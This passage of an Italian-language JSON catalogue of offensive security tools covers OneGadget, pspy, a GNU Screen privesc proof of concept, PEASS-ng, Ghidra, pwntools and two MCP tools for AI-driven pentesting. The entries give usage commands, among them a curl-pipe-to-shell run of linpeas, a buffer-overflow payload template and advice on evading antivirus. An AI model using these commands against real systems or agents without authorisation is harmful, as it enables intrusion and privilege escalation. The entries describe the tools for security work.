    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OneGadget è uno strumento fondamentale per lo sviluppo di exploit su Linux (CTF e reale). Cerca all'interno di una libreria <code>libc</code> condivisa gli offset di specifici frammenti di codice (\"gadget\") che, se eseguiti, portano direttamente all'esecuzione di una shell (<code>/bin/sh</code>). Questo semplifica drasticamente la costruzione di catene ROP, riducendo l'exploit a un singolo overwrite dell'instruction pointer se le condizioni sono soddisfatte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Constraint Analysis:</strong> Per ogni gadget trovato, elenca i vincoli sui registri (es. <code>rax == NULL</code>) che devono essere veri al momento del salto affinché l'exploit funzioni.</p><p><strong>Libc Database:</strong> Funziona su qualsiasi versione di libc fornita, permettendo di adattare l'exploit alla versione esatta del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire contro il file .so della libc.</p><pre><code># Trova gadget\none_gadget /lib/x86_64-linux-gnu/libc.so.6</code></pre><p>Output esempio: <code>0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp & 0xf == 0</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Binary Exploitation:</strong> Quando si ha un buffer overflow e un leak dell'indirizzo base della libc, OneGadget fornisce l'indirizzo a cui saltare per vincere istantaneamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Funziona solo se si conosce o si può leakare la versione della libc del sistema remoto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DominicBreuker/pspy",
    "desc": "Monitor di processi Linux senza privilegi di root: intercetta comandi, cron job, uid e guid in tempo reale via procfs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>pspy è uno strumento di command-line monitoring per Linux progettato per funzionare senza permessi di root. Sfrutta il file system <code>/proc</code> per scansionare continuamente i processi in esecuzione e catturare eventi di breve durata che sfuggirebbero a strumenti statici come <code>ps</code>. È la risorsa primaria per individuare cron job nascosti, script eseguiti da altri utenti e credenziali passate come argomenti da riga di comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cron Job Snooping:</strong> Rileva processi che vengono avviati periodicamente (tipico dei cron job). Vedere <em>cosa</em> viene eseguito e <em>con quali privilegi</em> (UID) è fondamentale per trovare vettori di Privilege Escalation (es. un cron job di root che esegue uno script scrivibile).</p><p><strong>Capture Argomenti:</strong> Cattura l'intera riga di comando dei processi. Questo permette di intercettare password, chiavi API o percorsi di file sensibili passati come argomenti a programmi in esecuzione.</p><p><strong>File System Monitoring:</strong> Utilizza <code>inotify</code> per monitorare eventi sul file system (accedibili dall'utente corrente), aiutando a correlare l'esecuzione di processi con la creazione/modifica di file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare il binario statico (disponibile per 32/64 bit) sulla macchina vittima ed eseguirlo.</p><pre><code># Esecuzione standard\n./pspy64\n\n# Monitoraggio specifico su una cartella e output su file\n./pspy64 -f -r /var/www/html -o events.log\n\n# Filtro per PID specifici (es. per monitorare cosa fa un demone)\n./pspy64 -p 1234</code></pre><p>L'output scorre in tempo reale, mostrando PID, UID, e comando completo colorati per leggibilità.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per la <strong>Linux Privilege Escalation</strong>. Se si è ottenuto un accesso low-privilege, pspy viene lasciato girare per rilevare automazioni di sistema. Esempio classico: rilevare un backup script eseguito ogni minuto da root che usa <code>tar *</code>, sfruttabile tramite wildcard injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> pspy genera un carico CPU notevole a causa del polling continuo su <code>/proc</code>. In ambienti monitorati, questo comportamento anomalo (high CPU usage da un processo sconosciuto) è facilmente rilevabile.</p><p><strong>Mitigazioni:</strong> Usare intervalli di polling più lunghi (flag <code>-i</code>) per ridurre il carico CPU, anche se si rischia di perdere processi molto veloci.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "screen-exploit-poc",
    "name": "screen-exploit-poc.sh",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Bash PoC per sfruttare vulnerabilità di Privilege Escalation locale in GNU Screen (es. CVE-2017-5618).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script sfrutta vulnerabilità storiche nel binario <code>screen</code> (terminal multiplexer), spesso installato con bit SUID su Linux. Versioni vulnerabili permettono a un utente locale di creare file con permessi di root (log file manipulation) o eseguire codice arbitrario tramite buffer overflow o race conditions durante l'apertura di nuovi screen.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Root File Write:</strong> Abusa della funzionalità di logging di Screen per sovrascrivere file sensibili (es. <code>/etc/ld.so.preload</code>) con contenuto controllato dall'attaccante, forzando il caricamento di librerie malevole.</p><p><strong>Privilege Escalation:</strong> Risultato finale è una shell root partendo da utente low-priv.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire sulla macchina target.</p><pre><code># Compilazione libreria malevola e esecuzione exploit\n./screen-exploit-poc.sh</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Linux Local Privesc:</strong> Utile su sistemi legacy o non patchati dove Screen 4.5.0 o inferiori sono presenti. Classico da CTF.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'exploit spesso corrompe file di configurazione. Rischioso su produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "PEASS-ng",
    "version": "20250904-27f4363e",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/peass-ng/PEASS-ng",
    "desc": "Privilege Escalation Awesome Scripts Suite (LinPEAS/WinPEAS): suite definitiva per enumerazione automatica vettori di privesc.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PEASS-ng è la raccolta standard de-facto per l'enumerazione locale post-exploitation. Include <strong>LinPEAS</strong> (Linux) e <strong>WinPEAS</strong> (Windows). Questi script eseguono una scansione esaustiva del sistema alla ricerca di misconfigurazioni, file sensibili, credenziali, vulnerabilità kernel e servizi sfruttabili per elevare i privilegi da utente standard a Root/SYSTEM. L'output colorato facilita l'identificazione immediata delle criticità (Rosso/Giallo = alta probabilità).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Checks:</strong> Verifica migliaia di vettori: permessi file, SUID, sudo rights, registry keys, servizi non quotati, DLL hijacking, processi in ascolto, versioni software vulnerabili.</p><p><strong>Credential Hunting:</strong> Cerca aggressivamente password in file di config, cronologia, database locali e memory dump.</p><p><strong>Cloud Awareness:</strong> Rileva se il sistema è in un ambiente cloud (AWS, Azure, GCP) e cerca metadati o credenziali cloud specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare ed eseguire lo script sulla macchina target.</p><pre><code># Linux (curl e pipe bash)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows (eseguibile o bat)\nwinpeas.exe domain users\n\n# Modalità stealth/fast\n./linpeas.sh -s (superfast/stealth)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Lo strumento #1 da lanciare dopo aver ottenuto una shell. Risparmia ore di enumerazione manuale. Ottimo anche per <strong>Hardening Audits</strong> per trovare buchi di sicurezza nei propri server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PEASS è molto rumoroso e conosciuto da tutti gli AV/EDR. LinPEAS tocca troppi file. WinPEAS viene quasi sempre cancellato da Defender.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate, eseguire solo check specifici o in memoria. In ambienti monitorati, usare l'enumerazione manuale guidata dai risultati di PEASS in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation"
    ],
    "notes": null
  },
  {
    "id": "ghidra-11-4-2-public",
    "name": "Ghidra",
    "version": "11.4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NationalSecurityAgency/ghidra",
    "desc": "Suite di Reverse Engineering open-source della NSA: disassembler, decompiler e debugger multi-architettura con scripting Java/Python.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ghidra è una piattaforma software di reverse engineering (SRE) sviluppata dal Research Directorate della NSA. Offre un ambiente completo per l'analisi di file binari (malware, firmware, eseguibili) su una vasta gamma di architetture (x86, ARM, MIPS, PowerPC, ecc.). La sua caratteristica più potente è il <strong>Decompiler</strong> avanzato, che ricostruisce una rappresentazione simil-C del codice assembly, rendendo l'analisi comprensibile anche senza conoscere a fondo l'assembly specifico.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Code Analysis:</strong> Esegue analisi automatica del binario per identificare funzioni, stringhe, chiamate di sistema e strutture dati. Il grafo di flusso (Function Graph) visualizza logicamente i percorsi di esecuzione.</p><p><strong>Collaborazione:</strong> Supporta il reverse engineering in team: più analisti possono lavorare sullo stesso progetto in tempo reale, condividendo annotazioni, rinomine di variabili e scoperte tramite un server centralizzato.</p><p><strong>Scripting & Estensibilità:</strong> Permette di automatizzare task ripetitivi tramite script in Java o Python. È possibile scrivere analizzatori custom per decifrare stringhe offuscate o risolvere importazioni dinamiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ghidra è un'applicazione GUI Java. Si crea un progetto, si importa il file e si lancia l'Auto Analyze.</p><pre><code># Workflow tipico (GUI)\n1. File -> New Project\n2. Import File (drag & drop del malware/eseguibile)\n3. Double click per aprire nel CodeBrowser\n4. \"Yes\" alla richiesta di Auto Analyze\n5. Navigare il Decompiler window per leggere il codice \"C-like\"</code></pre><p>Esiste anche una modalità \"Headless\" per analisi batch da riga di comando: <code>analyzeHeadless projectPath projectName -import binaryFile</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale per <strong>Malware Analysis</strong> (capire cosa fa un ransomware), <strong>Vulnerability Research</strong> (trovare buffer overflow in software chiusi) e <strong>CTF</strong>. È l'alternativa gratuita e potente a IDA Pro. Utile anche per analizzare firmware di dispositivi IoT per trovare hardcoded credentials.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede JDK installato. L'analisi automatica può impiegare molto tempo su binari grandi. Attenzione quando si analizza malware reale: eseguire sempre in una VM isolata, poiché Ghidra esegue il parsing di formati file complessi che potrebbero teoricamente contenere exploit contro il tool stesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwninit-3-3-1",
    "name": "pwninit",
    "version": "3.3.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/io12/pwninit",
    "desc": "Tool per automatizzare il setup di challenge di Binary Exploitation (CTF): scarica linker, patcha ELF e genera template exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PwnInit risolve il mal di testa di configurare l'ambiente per le challenge \"pwn\". Quando viene fornito un binario e una libc, PwnInit scarica automaticamente il linker (ld.so) corretto per quella versione di libc, patcha il binario per usare quel linker e quel rpath, e genera uno script Python (basato su pwntools) pronto per l'uso con tutti i path configurati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Patching:</strong> Usa <code>patchelf</code> per impostare l'interprete e l'RPATH del binario target, assicurando che giri localmente esattamente come sul server remoto.</p><p><strong>Template Generation:</strong> Crea un file <code>solve.py</code> con lo scheletro boilerplate per pwntools (connessione, caricamento ELF/Libc).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire nella cartella contenente il binario e la libc.</p><pre><code># Setup automatico\npwninit\n\n# Setup specificando i file manualmente\npwninit --bin challenge --libc libc.so.6 --ld ld-2.27.so</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>CTF Pwn:</strong> Risparmia 10-15 minuti di setup manuale per ogni challenge, garantendo che i simboli di debug e gli offset siano corretti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede <code>patchelf</code> e <code>elfutils</code> installati nel sistema.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwntools-4-14-1",
    "name": "pwntools",
    "version": "4.14.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Gallopsled/pwntools",
    "desc": "Framework Python per Capture The Flag e exploit development: semplifica interazione con binari, socket, packing dati e ROP chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Pwntools è una libreria Python progettata per rendere la scrittura di exploit rapida e robusta. È lo standard per le competizioni CTF (categoria Pwn/Binary Exploitation) ma è potente anche per exploit reali. Astrae la complessità di gestire socket, process pipes, conversioni di interi in byte (packing), e costruzione di payload ROP (Return Oriented Programming), permettendo all'exploiter di concentrarsi sulla logica della vulnerabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Tubes:</strong> Interfaccia unificata per comunicare con processi locali, socket remoti o serial port (<code>io.sendline()</code>, <code>io.recvuntil()</code>).</p><p><strong>ELF & ROP:</strong> Parsing automatico di binari ELF per trovare indirizzi di funzioni, stringhe e gadget ROP. Genera catene ROP automaticamente se possibile.</p><p><strong>Shellcode:</strong> Generatore integrato di shellcode per varie architetture (x86, ARM, MIPS) e OS.</p><p><strong>GDB Integration:</strong> Collega automaticamente un debugger GDB al processo target per analisi dinamica durante lo sviluppo dell'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa importando la libreria in script Python.</p><pre><code>from pwn import *\n\n# Connessione remota o avvio processo locale\nio = remote('target.com', 1337)\n# io = process('./vulnerable_binary')\n\n# Costruzione payload (Buffer Overflow)\npayload = b'A' * 64 + p64(0xdeadbeef)\n\n# Invio e interazione\nio.sendline(payload)\nio.interactive()</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale per sviluppare <strong>Buffer Overflow Exploit</strong>, format string attacks e heap exploitation. Usato per automatizzare l'interazione con servizi di rete complessi durante le fasi di fuzzing o exploit delivery.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>È un framework di sviluppo, non un tool \"point-and-click\". Richiede conoscenza di Python e assembly.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "5ire-0-13-2-appimage",
    "name": "5ire-0.13.2-x86_64.AppImage",
    "version": "0.13.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nanbingxyz/5ire",
    "desc": "Client desktop open-source per interagire con server MCP (Model Context Protocol) e agenti AI locali/remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>5ire è un ambiente di sviluppo e interfaccia client progettata per il Model Context Protocol (MCP). Funziona come il \"cervello\" grafico che permette agli utenti di connettere e orchestrare vari agenti AI e strumenti di cybersecurity (come HexStrike) in un'unica dashboard. Essendo distribuito come AppImage, offre portabilità immediata su Linux, permettendo ai pentester di interagire con LLM e tool offensivi senza configurazioni complesse dell'ambiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MCP Client:</strong> Agisce da interprete universale per qualsiasi server compatibile con lo standard MCP. Permette di caricare \"skills\" o toolset (come Nmap, Burp, o script custom) e renderli disponibili all'intelligenza artificiale per l'esecuzione.</p><p><strong>Gestione Agenti:</strong> Offre un'interfaccia per dialogare con diversi modelli (Locali via Ollama o Remoti via API) e monitorare l'esecuzione dei task in tempo reale, visualizzando output di comandi e log di errore.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Rendere eseguibile il file e lanciarlo.</p><pre><code>chmod +x 5ire-0.13.2-x86_64.appimage\n./5ire-0.13.2-x86_64.appimage</code></pre><p>Dall'interfaccia, configurare le connessioni ai server MCP (es. HexStrike server) e selezionare il modello LLM desiderato per iniziare l'orchestrazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per operatori che utilizzano framework di <strong>AI-Assisted Pentesting</strong>. Serve come console di comando per guidare l'AI nell'esecuzione di ricognizioni o exploit, mantenendo il controllo umano sul loop decisionale (Human-in-the-loop).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico generato dipende dagli agenti collegati. 5ire stesso è un client locale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Miscellaneous"
    ],
    "notes": null
  },
  {
    "id": "hexstrike-ai",
    "name": "hexstrike-ai",
    "version": "6.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0x4m4/hexstrike-ai",
    "desc": "Server MCP che integra LLM con 150+ tool offensivi per automatizzare recon, scanning e reporting in scenari pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HexStrike AI è un'innovativa implementazione del Model Context Protocol (MCP) che funge da ponte tra i moderni Large Language Models (come Claude, GPT-4) e l'arsenale di strumenti di cybersecurity. Permette agli agenti AI di \"usare\" fisicamente tool come Nmap, Nikto, SQLmap o script custom, orchestrando intere fasi di penetration test in autonomia o sotto supervisione umana, gestendo l'input/output e la logica decisionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Orchestrazione Multi-Agente:</strong> Crea agenti specializzati (es. \"Recon Agent\", \"Exploit Agent\") che collaborano. L'AI decide quale tool lanciare basandosi sui risultati dello step precedente (es. \"Ho trovato la porta 80 aperta con Nmap, ora lancio Nikto\").</p><p><strong>Integrazione Toolset:</strong> Supporta nativamente oltre 150 strumenti offensivi. Gestisce l'installazione, la sintassi corretta dei comandi e il parsing dell'output per renderlo comprensibile al modello linguistico.</p><p><strong>Reporting & Logging:</strong> Traccia ogni azione eseguita e genera report narrativi delle scoperte. Include meccanismi di sicurezza (Human-in-the-loop) per richiedere approvazione prima di eseguire azioni aggressive o pericolose.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si configura come server MCP a cui l'LLM client si connette.</p><pre><code># Avvio del server MCP\npython hexstrike_server.py --config config.yaml\n\n# Esempio di prompt all'AI collegata\n\"Esegui una ricognizione completa su target.com. Inizia con discovery sottodomini,\npoi scansiona le porte e identifica le tecnologie web.\nSegnala eventuali vulnerabilità critiche ma chiedi conferma prima di lanciare exploit.\"</code></pre><p>Richiede un file di configurazione con i percorsi dei tool e le API key necessarie.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Automated Pentesting:</strong> Velocizza drasticamente le fasi di ricognizione e vulnerabilità assessment iniziali. <strong>Red Teaming Assistito:</strong> Funge da \"copilota\" per l'operatore, suggerendo comandi o analizzando output complessi in tempo reale. <strong>Training:</strong> Permette ai junior di vedere come un'AI strutturerebbe un attacco logico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'automazione AI tende ad essere veloce e \"robotica\". Se non configurata con delay e jitter, genererà pattern di traffico molto rumorosi. <strong>Rischi:</strong> Un'AI potrebbe \"allucinare\" un comando distruttivo o attaccare un target fuori scope se le regole di ingaggio (System Prompt) non sono rigorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Miscellaneous"
    ],
    "notes": null
  }
]